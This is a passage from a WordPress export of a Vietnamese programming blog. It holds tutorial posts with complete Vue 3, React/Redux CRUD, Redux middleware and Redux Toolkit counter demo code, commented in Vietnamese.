                {{ tr.name }} - {{ tr.age }}
            </li>
        </u>
    </div>
</template>

<script>
import { ref } from "vue";
export default {
    //vẫn cần phải nhớ, mọi biến gọi ra trong setup() đều phải được sử dụng, nếu không sẽ lỗi
    setup() {
        const transactions = ref([]);
        const error = ref(null);

        const fetchData = async () => {
            try {
                const response = await fetch("http://localhost:3000/user");
                if (!response.ok) throw new Error("Somthing went wrong");
                transactions.value = await response.json(); //trả về dạng: [{name:...,age:...}]
            } catch (e) {
                error.value = e;
                console.log(e);
            }
        };
        fetchData();
        return { transactions, error };
    },
};
</script>

<style scoped>
</style>
</pre>

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1298</wp:post_id>
		<wp:post_date><![CDATA[2021-07-01 09:59:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-07-01 02:59:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-07 00:51:37]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-07 00:51:37]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vuejs3-fetching-data]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="vuejs-v2"><![CDATA[VueJS-v2]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Demo-CRUD: 2. ListStudent with Redux, use Middleware]]></title>
		<link>https://duycode.com/2021/06/29/demo-crud-2-liststudent-with-redux-use-middleware/</link>
		<pubDate>Mon, 28 Jun 2021 19:00:58 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1324</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif" alt="Redux" />
** Kiến thức chú ý trong bài:
- Redux: dispatch, action, reducer
- Middleware
- Redux devtools extension
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
    <style>
        table {
            border-collapse: collapse;
        }

        th,
        td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }
    </style>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js"></script>

    <!-- =========== src/utils.js =========== -->
    <script>
        class Uuid {
            s4() {
                return Math.floor((1 + Math.random()) * 0x10000)
                    .toString(16)
                    .substring(1);
            }
            s16() {
                return this.s4() + this.s4() + this.s4() + this.s4();
            }
        }
        let uuid = new Uuid();
    </script>


    <!-- =========== constants/ActionTypes.js =========== -->
    <script>
        //Các hằng số types ==> sử dụng cho các actions
        const types = {
            SAVE_STUDENT: 'SAVE_STUDENT',
            DELETE_STUDENT: 'DELETE_STUDENT',
            SET_LIST_STUDENT: 'SET_LIST_STUDENT',
        };
    </script>

    <!-- =========== reducers/listStudent_reducer.js =========== -->
    <script>
        //Trong 1 Reducer bao gồm 2 thành phần: state và reducer
        //State là nơi chứa dữ liệu
        //Reducer là nơi xử lý các action (khi bị dispatch)
        //---- listStudent_state có thể khởi tạo mặc định hoặc lấy trên localStorage
        let listStudent_state = JSON.parse(localStorage.getItem('listStudent')) || [];
        let listStudent_reducer = (state = listStudent_state, action) => {
            //Khi làm việc với state, cần return ra 1 state mới, 
            //Tốt nhất nên copystate cũ luôn
            let new_state = [...state]
            switch (action.type) {
                case types.SAVE_STUDENT:
                    if (!action.payload.id) {
                        let new_student = {
                            id: uuid.s16(),
                            username: action.payload.username,
                            email: action.payload.email,
                        };
                        new_state.push(new_student);
                    } else {
                        let find_student = new_state.find((item) => item.id == action.payload.id);
                        find_student.username = action.payload.username;
                        find_student.email = action.payload.email;
                    }
                    localStorage.setItem('listStudent', JSON.stringify(new_state));
                    return new_state;

                case types.DELETE_STUDENT:
                    new_state = state.filter((item) => item.id != action.payload);
                    localStorage.setItem('listStudent', JSON.stringify(new_state));
                    return new_state;

                case types.SET_LIST_STUDENT:
                    localStorage.setItem('listStudent', JSON.stringify(action.payload));
                    return action.payload;
            }
            return new_state;
        };
    </script>

    <!-- =========== reducers/listproduct_Reducer.js =========== -->

    <!-- =========== reducers/index.js =========== -->
    <script>
        //Combine nhiều Reducers lại để tạo ra 1 Reducer duy nhất
        let rootReducer = Redux.combineReducers({
            listStudent: listStudent_reducer,
            //product: productReducer,
        });
    </script>

    <!-- =========== actions/index.js =========== -->
    <script>
        //Các action khi được dispatch ==> sẽ trả về object actions tương ứng
        let action_saveStudent = (student) => ({
            type: types.SAVE_STUDENT,
            payload: student,
        });
        let action_deleteStudent = (id) => ({
            type: types.DELETE_STUDENT,
            payload: id,
        });
        let action_setListStudent = (list) => ({
            type: types.SET_LIST_STUDENT,
            payload: list,
        })

        // Trường hợp action là 1 function get api (không trả về 1 object nữa)
        // ==> Giải quyết bằng cách dùng middleware ==> Từ action này lại dispatch 1 action khác 
        let action_getAllStudent = () => async (dispatch) => {
            let url = 'https://fakestoreapi.com/users?limit=10';
            let response = await fetch(url);
            let responseJSON = await response.json();
            dispatch(action_setListStudent(responseJSON));
        };
    </script>

    <!-- =========== middleware/list_middleware.js =========== -->
    <script>
        //Khi action là 1 function get api (không phải là 1 object như bình thường, cần phải xử lý qua middleware)
        const processFunctionMiddleware = store => next => action => {
            if (typeof action === 'function') {
                // Vì action_getAllStudent là 1 hàm, nên cần truyền lại dispatch vào hàm đó để sử dụng
                // Câu lệnh này sẽ khởi chạy được đoạn: "dispatch(action_setListStudent(list));"
                return action(next)
            }
            // Nếu action không trả về 1 function, thì chắc là nó trả về 1 object, nếu thế thì cho nó đi tiếp luôn :D
            return next(action);
        }

        //Middleware là việc kiểm tra và xử lý các action trước ==> convert các action đúng ý mình trước đã, rồi mới cho đi tiếp
        const checkSymbolMiddleware = store => next => action => {
            //console.log(store, next, action, store.getState());
            if (action.type == types.SAVE_STUDENT && action.payload.username.includes("fuck")) {
                action.payload.username = action.payload.username.replaceAll("fuck", "****")
            }
            //next: tương đương với "dispatch" ==> next(action) tương đương dispatch(action)==>nghĩa là chạy bình thường
            return next(action);
        }

    </script>

    <!-- =========== src/store.js =========== -->
    <script type="text/babel">
        // Cái đoạn lằng nhằng là để sử dụng cho redux chrome extensions
        const composeEnhancers =
            typeof window === 'object' &&
                window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ ?
                window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__({
                    // Specify extension’s options like name, actionsBlacklist, actionsCreators, serialize...
                }) : Redux.compose;
        // Gọi store bằng reducers(basic): const store = Redux.createStore(rootReducer);
        // Ném các middleware vào trong Redux.applyMiddleware()
        const store = Redux.createStore(
            rootReducer /* preloadedState, */,
            composeEnhancers(Redux.applyMiddleware(processFunctionMiddleware, checkSymbolMiddleware))
        );
    </script>

    <!-- =========== components/App.js =========== -->
    <script type="text/babel">
        function App(props) {
            const { listStudent, dispatch_saveStudent, dispatch_deleteStudent, dispatch_getAllStudent } = props;

            const [filterName, setFilterName] = React.useState('');
            const [student, setStudent] = React.useState({ username: '', email: '', id: '' });

            const updateState_student = (e) => {
                let newStudent = { ...student };
                newStudent[e.target.name] = e.target.value;
                setStudent(newStudent)
            };

            const onSaveStudent = (e) => {
                if (!student.username || !student.email) return;
                dispatch_saveStudent(student);
                //reset state sau khi save xong
                setStudent({ username: '', email: '', id: '' });
            };

            return (
                <div>
                    <button onClick={() => { setStudent({ username: '', email: '', id: '' }) }}>New Student</button> <br />
                    <input type="text" placeholder="username" name="username"
                        value={student.username}
                        onChange={updateState_student}
                    /> <br />
                    <input
                        type="text" placeholder="email" name="email"
                        value={student.email}
                        onChange={updateState_student}
                    /> <br />
                    <button onClick={onSaveStudent}>
                        {student.id ? 'Update Student' : 'Add Student'}
                    </button> <br /> <br />
                    <input type="text" placeholder="Search ..." name="txtFilterName"
                        value={filterName}
                        onChange={e => { setFilterName(e.target.value) }}
                    />
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Username</th>
                                <th>Email</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            {
                                listStudent
                                    .filter((item) => item.username.includes(filterName))
                                    .map((item, index) => {
                                        return (
                                            <tr key={item.id}>
                                                <td>{index}</td>
                                                <td>{item.username}</td>
                                                <td>{item.email}</td>
                                                <td>
                                                    <button onClick={e => { setStudent({ ...item }) }}>Sửa</button>
                                                    <button onClick={e => { dispatch_deleteStudent(item.id) }}>Xóa</button>
                                                </td>
                                            </tr>
                                        );
                                    })
                            }
                        </tbody>
                    </table>
                    <button onClick={e => { dispatch_getAllStudent() }}>Get Student Online</button>
                </div>
            );

        }
    </script>

    <!-- =========== container/AppContainer.js =========== -->
    <script type="text/babel">
        //Dùng riêng 1 HOC mục đích chỉ để hứng các props từ Redux
        //Các props hứng được từ Redux lại chuyển tiếp về Component
        //mapStateToProps: chuyển state từ store thành props của component
        let mapStateToProps_App = (state) => ({
            listStudent: state.listStudent,
        })
        //mapDispatchToProps: chuyển action từ store thành props của component
        let mapDispatchToProps_App = (dispatch, props) => ({
            dispatch_saveStudent: (student) => {
                dispatch(action_saveStudent(student));
            },
            dispatch_deleteStudent: (id) => {
                dispatch(action_deleteStudent(id));
            },
            dispatch_getAllStudent: () => {
                dispatch(action_getAllStudent());
            },
        })

        //connect Component Container với Redux bằng connect với 2 biến là props: mapStateToProps, mapDispatchToProps
        let AppConnect = ReactRedux.connect(mapStateToProps_App, mapDispatchToProps_App)(App);
    </script>

    <!-- =========== src/index.js =========== -->
    <script type="text/babel">
        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên
        const Provider = ReactRedux.Provider;
        ReactDOM.render(
            <Provider store={store}>
                <AppConnect />
            </Provider>,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1324</wp:post_id>
		<wp:post_date><![CDATA[2021-06-29 02:00:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-28 19:00:58]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-29 02:00:58]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-28 19:00:58]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[demo-crud-2-liststudent-with-redux-use-middleware]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Demo-CRUD: 1. ListStudent with Redux [ Class ]]]></title>
		<link>https://duycode.com/2021/06/29/demo-crud-1-liststudent-with-redux-class/</link>
		<pubDate>Mon, 28 Jun 2021 18:00:43 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1357</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif" alt="Redux" />
<h3>Các kiến thức trong Project này gồm có:</h3>
- Sử dụng Class: props, state, event
- Redux: Reducers, actions, container components
- Storage
- Protypes
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ReactJS</title>
    <style>
        table {
            border-collapse: collapse;
        }

        th, td {
            padding: 0 0.5rem;
            border: 1px solid black;
        }
    </style>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js"></script>
    <script src="https://unpkg.com/prop-types@15.6/prop-types.js"></script>
    <!-- =========== src/utils.js =========== -->
    <script>
        class Uuid {
            s4() {
                return Math.floor((1 + Math.random()) * 0x10000)
                    .toString(16)
                    .substring(1);
            }
            s16() {
                return this.s4() + this.s4() + this.s4() + this.s4();
            }
        }
        let uuid = new Uuid();
    </script>

    <!-- =========== constants/ActionTypes.js =========== -->
    <script>
        //Các hằng số types ==> sử dụng cho các actions
        const types = {
            SAVE_STUDENT: 'SAVE_STUDENT',
            DELETE_STUDENT: 'DELETE_STUDENT',
        };
    </script>

    <!-- =========== reducers/listStudent_reducer.js =========== -->
    <script>
        //Trong 1 Reducer bao gồm 2 thành phần: state và reducer
        //State là nơi chứa dữ liệu
        //Reducer là nơi xử lý các action (khi bị dispatch)
        //---- listStudent_state có thể khởi tạo mặc định hoặc lấy trên localStorage
        let listStudent_state = JSON.parse(localStorage.getItem('listStudent')) || [];
        let listStudent_reducer = (state = listStudent_state, action) => {
            //Khi làm việc với state, cần return ra 1 state mới, 
            //Tốt nhất nên copystate cũ luôn
            let new_state = [...state]
            switch (action.type) {
                case types.SAVE_STUDENT:
                    if (!action.student.id) {
                        let new_student = {
                            id: uuid.s16(),
                            username: action.student.username,
                            email: action.student.email,
                        };
                        new_state.push(new_student);
                    } else {
                        let find_student = new_state.find((item) => item.id == action.student.id);
                        find_student.username = action.student.username;
                        find_student.email = action.student.email;
                    }
                    localStorage.setItem('listStudent', JSON.stringify(new_state));
                    return new_state;

                case types.DELETE_STUDENT:
                    new_state = state.filter((item) => item.id != action.id);
                    localStorage.setItem('listStudent', JSON.stringify(new_state));
                    return new_state;
            }
            return new_state;
        };
    </script>

    <!-- =========== reducers/listproduct_Reducer.js =========== -->

    <!-- =========== reducers/index.js =========== -->
    <script>
        //Combine nhiều Reducers lại để tạo ra 1 Reducer duy nhất
        let rootReducer = Redux.combineReducers({
            listStudent: listStudent_reducer,
            //product: productReducer,
        });
    </script>

    <!-- =========== actions/index.js =========== -->
    <script>
        //Các action khi được dispatch ==> sẽ trả về object actions tương ứng
        let action_saveStudent = (student) => {
            return {
                type: types.SAVE_STUDENT,
                student: student,
            };
        };
        let action_deleteStudent = (id) => {
            return {
                type: types.DELETE_STUDENT,
                id: id,
            };
        };

    </script>

    <!-- =========== components/App.js =========== -->
    <script type="text/babel">
        class App extends React.Component {
            constructor(props) {
                super(props);
                this.state = {
                    txtFilterName: '',
                    student: {},
                };
            }

            updateState_student = (e) => {
                let updateStudent = this.state.student;
                updateStudent[e.target.name] = e.target.value;
                this.setState({
                    student: updateStudent,
                });
            };

            onFilterStudent = (e) => {
                e.preventDefault();
                this.setState({
                    txtFilterName: e.target.value,
                });
            };

            onNewStudent = (e) => {
                e.preventDefault();
                this.setState({
                    student: {},
                });
            };
            onEditStudent = (e, student) => {
                e.preventDefault();
                this.setState({
                    student: { ...student },
                });
            };
            onSaveStudent = (e) => {
                e.preventDefault();
                if (!this.state.student.username || !this.state.student.email) return;
                this.props.dispatch_saveStudent(this.state.student);
                //reset state sau khi save xong
                this.setState({
                    student: {},
                });
            };

            onDeleteStudent = (e, id) => {
                e.preventDefault();
                this.props.dispatch_deleteStudent(id);
            };

            render() {
                // console.log(this.props);
                let filter = this.state.txtFilterName;
                let tr_listStudent = this.props.listStudent
                    .filter((item) => item.username.includes(filter))
                    .map((item, index) => {
                        return (
                            <tr key={item.id}>
                                <td>{index}</td>
                                <td>{item.username}</td>
                                <td>{item.email}</td>
                                <td>
                                    <button onClick={(e) => this.onEditStudent(e, item)}>Sửa</button>
                                    <button onClick={(e) => this.onDeleteStudent(e, item.id)}>Xóa</button>
                                </td>
                            </tr>
                        );
                    });

                return (
                    <div>
                        <button onClick={this.onNewStudent}>New Student</button>
                        <br />
                        <input type="text" placeholder="username" name="username"
                            value={this.state.student.username}
                            onChange={this.updateState_student}
                        />
                        <br />
                        <input type="text" placeholder="email" name="email"
                            value={this.state.student.email}
                            onChange={this.updateState_student}
                        />
                        <br />
                        <button onClick={this.onSaveStudent}>
                            {this.state.student.id ? 'Update Student' : 'Add Student'}
                        </button>
                        <br />
                        <br />
                        <input type="text" placeholder="Search ..." name="txtFilterName"
                            value={this.state.txtFilterName}
                            onChange={this.onFilterStudent}
                        />
                        <table>
                            <thead>
                                <tr>
                                    <th>#</th>
                                    <th>Username</th>
                                    <th>Email</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody>{tr_listStudent}</tbody>
                        </table>
                    </div>
                );
            }
        }
    </script>

    <!-- =========== container/AppContainer.js =========== -->
    <script type="text/babel">
        //Dùng riêng 1 class Container chỉ để mục đích hứng các props từ Redux
        //Các props hứng được từ Redux lại chuyển tiếp về Component
        class AppContainer extends React.Component {
            render() {
                return (
                    <App
                        listStudent={this.props.listStudent}
                        product={this.props.product}
                        dispatch_saveStudent={this.props.dispatch_saveStudent}
                        dispatch_deleteStudent={this.props.dispatch_deleteStudent}
                    />
                );
            }
        }

        //check dữ liệu nhận từ store (props) bằng propTypes
        AppContainer.propTypes = {
            listStudent: PropTypes.arrayOf(
                PropTypes.shape({
                    username: PropTypes.string,
                    email: PropTypes.string,
                })
            ).isRequired,
        };

        //mapStateToProps: chuyển state từ store thành props của component
        let mapStateToProps_App = (state) => {
            return {
                listStudent: state.listStudent,
                product: state.product,
            };
        };
        //mapDispatchToProps: chuyển action từ store thành props của component
        let mapDispatchToProps_App = (dispatch, props) => {
            return {
                dispatch_saveStudent: (student) => {
                    dispatch(action_saveStudent(student));
                },
                dispatch_deleteStudent: (id) => {
                    dispatch(action_deleteStudent(id));
                },
            };
        };
        //connect Component Container với Redux bằng connect
        let AppConnect = ReactRedux.connect(mapStateToProps_App, mapDispatchToProps_App)(AppContainer);
    </script>

    <!-- =========== src/store.js =========== -->
    <script type="text/babel">
        //Gọi store bằng reducers, cái đoạn lằng nhằng là để sử dụng cho redux chrome extensions
        //const store = Redux.createStore(rootReducer);
        const store = Redux.createStore(
            rootReducer /* preloadedState, */,
            window.__REDUX_DEVTOOLS_EXTENSION__ && window.__REDUX_DEVTOOLS_EXTENSION__()
        );
    </script>

    <!-- =========== src/index.js =========== -->
    <script type="text/babel">
        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên
        const Provider = ReactRedux.Provider;
        ReactDOM.render(
            //Lúc này, không còn gọi class App nữa, mà gọi AppContainer là Appconnect
            <Provider store={store}>
                <AppConnect />
            </Provider>,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1357</wp:post_id>
		<wp:post_date><![CDATA[2021-06-29 01:00:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-28 18:00:43]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-29 01:00:43]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-28 18:00:43]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[demo-crud-1-liststudent-with-redux-class]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Demo-Count: 6. use Redux-Toolkit]]></title>
		<link>https://duycode.com/2021/06/28/react-demo-6-simple-count-with-redux-toolkit/</link>
		<pubDate>Sun, 27 Jun 2021 23:00:21 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1459</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif" alt="" />

<h2>4. Demo app Count with use ReactJS, Redux and Redux-Toolkit</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Demo app Count with use ReactJS and Redux</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js"></script>

    <script src="https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js"></script>

    <!-- =========== slices/count_slice.js =========== -->
    <script>
        //1. Khai báo Slice: Dùng RTK.createSlice khai báo tất cả State, Reducers và Actions luôn
        const countSlice = RTK.createSlice({
            name: 'count',
            initialState: { amount: 1 },
            reducers: {
                action_increment(state, action) {
                    state.amount += action.payload.amount;
                },
                action_decrement(state, action) {
                    state.amount -= action.payload.amount;
                },
            }
        });
        // Export ra các actions, reducer tương ứng :D
        const { action_increment, action_decrement } = countSlice.actions;
        const countReducer = countSlice.reducer;
    </script>

    <!-- =========== src/store.js =========== -->
    <script type="text/babel">
        //2. Khai báo store: tất cả các Reducer trong store ở dưới đây
        const store = RTK.configureStore({
            reducer: {
                count: countReducer
            }
        })
    </script>

    <!-- =========== components/App.js =========== -->
    <script type="text/babel">
        //3. Sử dụng store: Dùng useSelector và useDispatch để lấy dữ liệu từ Redux
        function App(props) {

            const count = ReactRedux.useSelector(state => state.count);
            const dispatch = ReactRedux.useDispatch();
            return (
                <div>
                    <p>{count.amount}</p>
                    <button onClick={() => { dispatch(action_increment({ amount: 1 })) }}>Increase</button>
                    <button onClick={() => { dispatch(action_decrement({ amount: 1 })) }}>Decrease</button>
                </div>
            )
        }
    </script>

    <!-- =========== src/index.js =========== -->
    <script type="text/babel">
        //4. Connect Store của Redux bằng Provider;
        const Provider = ReactRedux.Provider;
        ReactDOM.render(
            <Provider store={store}>
                <App />
            </Provider>,
            document.getElementById('root')
        );
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1459</wp:post_id>
		<wp:post_date><![CDATA[2021-06-28 06:00:21]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-27 23:00:21]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-28 06:00:21]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-27 23:00:21]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[react-demo-6-simple-count-with-redux-toolkit]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Demo-Count: 4. use Redux without React]]></title>
		<link>https://duycode.com/2021/06/28/demo-count-4-use-redux-without-react/</link>
		<pubDate>Sun, 27 Jun 2021 21:00:57 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1541</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif" alt="Redux" />
*** Redux gồm 5 phần chính
- Khai báo State
- Khai báo Reducer (dựa trên State)
- Khai báo action
- Khai báo Store (dựa trên Reducer)
- Dispatch action --> thay đổi state
- Subscribe --> hành động khi state thay đổi
- Redux không nhất thiết phải dùng với ReactJS, có thể dùng với VueJS thoải mái
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redux without React</title>
</head>

<body>
    <button id="btnIncrement">Increment</button>
    <button id="btnDecrement">Decrement</button>
    <p id="txtCount"></p>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
    <script>
        const txtCount = document.getElementById("txtCount");
        const btnIncrement = document.getElementById("btnIncrement");
        const btnDecrement = document.getElementById("btnDecrement");
        const { createStore, combineReducers } = window.Redux;

        //1. Khai báo state
        const initialState = { amount: 1 }
        //2. Khai báo Reducer
        const countReducer = (state = initialState, action) => {
            let newState = { ...state }
            switch (action.type) {
                case 'INCREMENT': {
                    newState.amount += action.payload.amount
                    return newState
                }
                case 'DECREMENT': {
                    newState.amount -= action.payload.amount
                    return newState
                }
                default: return state;
            }
        }

        //3. Khai báo action
        const action_increment = (payload) => ({
            type: 'INCREMENT',
            payload: payload,
        })
        const action_decrement = (payload) => ({
            type: 'DECREMENT',
            payload: payload,
        })

        //4. Khai báo store (rootReducer: bao gồm nhiều Reducer)
        const rootReducer = combineReducers({
            count: countReducer,
        })
        const store = createStore(rootReducer);

        //5. Dispatch Action
        btnIncrement.onclick = () => {
            store.dispatch(action_increment({ amount: 1 }))
        }
        btnDecrement.onclick = () => {
            store.dispatch(action_decrement({ amount: 1 }))
        }

        //...Render lần đầu
        txtCount.innerText = store.getState().count.amount;

        //... Subscribe state khi state thay đổi
        store.subscribe(() => {
            txtCount.innerText = store.getState().count.amount;
        })
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1541</wp:post_id>
		<wp:post_date><![CDATA[2021-06-28 04:00:57]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-27 21:00:57]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-28 04:00:57]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-27 21:00:57]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[demo-count-4-use-redux-without-react]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="reactjs"><![CDATA[ReactJS]]></category>
						</item>
					<item>
		<title><![CDATA[Demo-Count: 5. use Redux]]></title>
		<link>https://duycode.com/2021/06/28/demo-count-5-use-redux/</link>
		<pubDate>Sun, 27 Jun 2021 22:00:36 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1547</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif" alt="" />
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Demo app Count with use ReactJS and Redux</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js"></script>

    <!-- =========== reducers/count_reducer.js =========== -->
    <script>
        //1.1. Khai báo state
        const initialCount = { amount: 1 }
        //1.2. Khai báo Reducer
        const countReducer = (state = initialCount, action) => {
            let newState = { ...state }
            switch (action.type) {
                case 'INCREMENT': {
                    newState.amount += action.payload.amount
                    return newState
                }
                case 'DECREMENT': {
                    newState.amount -= action.payload.amount
                    return newState
                }
                default: return state;
            }
        }
    </script>

